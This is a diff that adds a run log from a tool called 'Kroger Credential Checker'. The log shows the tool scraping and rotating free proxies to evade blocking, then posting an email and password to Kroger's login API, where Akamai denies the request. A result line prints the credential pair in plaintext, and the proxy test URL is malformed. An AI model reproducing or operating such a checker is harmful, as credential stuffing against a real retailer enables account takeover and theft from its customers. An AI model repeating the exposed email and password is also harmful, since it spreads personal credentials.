@@ -1,0 +1,62 @@
+2025-03-30 00:20:39,667 - INFO - Starting Kroger Credential Checker
+2025-03-30 00:23:40,253 - INFO - Proxy usage: Enabled
+2025-03-30 00:23:44,136 - INFO - Selected mode: Single check
+2025-03-30 00:23:44,137 - DEBUG - Initializing KrogerChecker instance
+2025-03-30 00:23:44,137 - DEBUG - Proxy usage enabled, initializing proxy
+2025-03-30 00:23:44,137 - DEBUG - Starting proxy rotation (max 3 attempts)
+2025-03-30 00:23:44,137 - DEBUG - Attempt 1: Getting new proxy
+2025-03-30 00:23:44,207 - DEBUG - Starting new HTTPS connection (1): www.sslproxies.org:443
+2025-03-30 00:23:44,430 - DEBUG - https://www.sslproxies.org:443 "GET / HTTP/1.1" 200 None
+2025-03-30 00:23:44,442 - DEBUG - Starting new HTTP connection (1): 194.87.219.41:35571
+2025-03-30 00:23:49,450 - DEBUG - Starting new HTTP connection (1): 43.130.57.165:13001
+2025-03-30 00:23:49,538 - DEBUG - http://43.130.57.165:13001 "GET http://https//www.google.com HTTP/1.1" 502 157
+2025-03-30 00:23:49,539 - DEBUG - Testing proxy: http://43.130.57.165:13001
+2025-03-30 00:23:49,539 - DEBUG - Sending test request to Kroger.com
+2025-03-30 00:23:49,541 - DEBUG - Starting new HTTPS connection (1): www.kroger.com:443
+2025-03-30 00:23:58,693 - WARNING - Proxy test failed: HTTPSConnectionPool(host='www.kroger.com', port=443): Max retries exceeded with url: / (Caused by ProxyError('Unable to connect to proxy', OSError('Tunnel connection failed: 502 Bad Gateway')))
+2025-03-30 00:23:58,694 - DEBUG - Response headers: N/A
+2025-03-30 00:23:58,694 - DEBUG - Attempt 2: Getting new proxy
+2025-03-30 00:23:58,695 - DEBUG - Starting new HTTPS connection (1): www.sslproxies.org:443
+2025-03-30 00:23:58,810 - DEBUG - https://www.sslproxies.org:443 "GET / HTTP/1.1" 200 None
+2025-03-30 00:23:58,819 - DEBUG - Starting new HTTP connection (1): 15.235.10.43:28003
+2025-03-30 00:23:59,901 - DEBUG - http://15.235.10.43:28003 "GET http://https//www.google.com HTTP/1.1" 503 0
+2025-03-30 00:23:59,903 - DEBUG - Starting new HTTP connection (1): 43.135.186.145:13001
+2025-03-30 00:24:00,001 - DEBUG - http://43.135.186.145:13001 "GET http://https//www.google.com HTTP/1.1" 502 157
+2025-03-30 00:24:00,002 - DEBUG - Testing proxy: http://43.135.186.145:13001
+2025-03-30 00:24:00,002 - DEBUG - Sending test request to Kroger.com
+2025-03-30 00:24:00,003 - DEBUG - Starting new HTTPS connection (1): www.kroger.com:443
+2025-03-30 00:24:00,087 - WARNING - Proxy test failed: ('Connection aborted.', RemoteDisconnected('Remote end closed connection without response'))
+2025-03-30 00:24:00,088 - DEBUG - Response headers: N/A
+2025-03-30 00:24:00,088 - DEBUG - Attempt 3: Getting new proxy
+2025-03-30 00:24:00,089 - DEBUG - Starting new HTTPS connection (1): www.sslproxies.org:443
+2025-03-30 00:24:00,121 - DEBUG - https://www.sslproxies.org:443 "GET / HTTP/1.1" 200 None
+2025-03-30 00:24:00,131 - DEBUG - Starting new HTTP connection (1): 49.51.245.200:13001
+2025-03-30 00:24:00,218 - DEBUG - http://49.51.245.200:13001 "GET http://https//www.google.com HTTP/1.1" 502 157
+2025-03-30 00:24:00,218 - DEBUG - Testing proxy: http://49.51.245.200:13001
+2025-03-30 00:24:00,219 - DEBUG - Sending test request to Kroger.com
+2025-03-30 00:24:00,220 - DEBUG - Starting new HTTPS connection (1): www.kroger.com:443
+2025-03-30 00:24:10,719 - WARNING - Proxy test failed: HTTPSConnectionPool(host='www.kroger.com', port=443): Max retries exceeded with url: / (Caused by ProxyError('Unable to connect to proxy', RemoteDisconnected('Remote end closed connection without response')))
+2025-03-30 00:24:10,719 - DEBUG - Response headers: N/A
+2025-03-30 00:24:10,719 - WARNING - No working proxy found after 3 attempts
+2025-03-30 00:24:30,380 - DEBUG - Received credentials for: ffkrio@gmail.com
+2025-03-30 00:24:30,381 - INFO - Starting single credential check for: ffkrio@gmail.com
+2025-03-30 00:24:30,381 - DEBUG - Starting credential validation
+2025-03-30 00:24:30,381 - DEBUG - Target URL: https://www.kroger.com/auth/api/login
+2025-03-30 00:24:30,381 - DEBUG - Preparing login request payload
+2025-03-30 00:24:30,381 - DEBUG - Sending login request
+2025-03-30 00:24:30,383 - DEBUG - Starting new HTTPS connection (1): www.kroger.com:443
+2025-03-30 00:24:30,432 - DEBUG - https://www.kroger.com:443 "POST /auth/api/login HTTP/1.1" 403 390
+2025-03-30 00:24:30,433 - DEBUG - Received response status: 403
+2025-03-30 00:24:30,433 - DEBUG - Response headers: {'Server': 'AkamaiGHost', 'Mime-Version': '1.0', 'Content-Type': 'text/html', 'Content-Length': '390', 'Expires': 'Sun, 30 Mar 2025 00:24:30 GMT', 'Cache-Control': 'max-age=0, no-cache, no-store', 'Pragma': 'no-cache', 'Date': 'Sun, 30 Mar 2025 00:24:30 GMT', 'Connection': 'close', 'Server-Timing': 'cdn-cache; desc=HIT, edge; dur=1, ak_p; desc="1743294270386_388971307_1502665745_120_17719_0_23_-";dur=1', 'Set-Cookie': 'akaalb_KT_Digital_BannerSites=~op=KT_Digital_BannerSites_Legacy:kcvg|~rv=62~m=kcvg:0|~os=49d9e32c4b6129ccff2e66f9d0390271~id=292ca7ae8901d4fa2308f74782706abb; path=/; HttpOnly; Secure; SameSite=None', 'X-Frame-Options': 'SAMEORIGIN', 'X-KT-ACR-LMA-CT': 'true', 'X-Correlation-ID': 'akam_1743294270_cb2ccbce-35a0-4754-a330-a595da08dffa', 'Strict-Transport-Security': 'max-age=31536000 ; preload', 'Akamai-GRN': '0.2b3b2f17.1743294270.5990dc11'}
+2025-03-30 00:24:30,433 - DEBUG - Response content (first 200 chars): <HTML><HEAD>
+<TITLE>Access Denied</TITLE>
+</HEAD><BODY>
+<H1>Access Denied</H1>
+ 
+You don't have permission to access "http&#58;&#47;&#47;www&#46;kroger&#46;com&#47;auth&#47;api&#47;login" on this serv
+2025-03-30 00:24:30,433 - WARNING - Login failed with status 403
+2025-03-30 00:24:30,433 - INFO - INVALID CREDENTIALS: ffkrio@gmail.com
+2025-03-30 00:24:30,434 - DEBUG - Result: {'email': 'ffkrio@gmail.com', 'password': 'sjfkg', 'valid': False, 'proxy': None}
+2025-03-30 00:24:30,434 - DEBUG - Closing session and cleaning up resources
+2025-03-30 00:24:30,434 - INFO - Checker session closed
+2025-03-30 00:24:30,434 - INFO - Checker execution completed
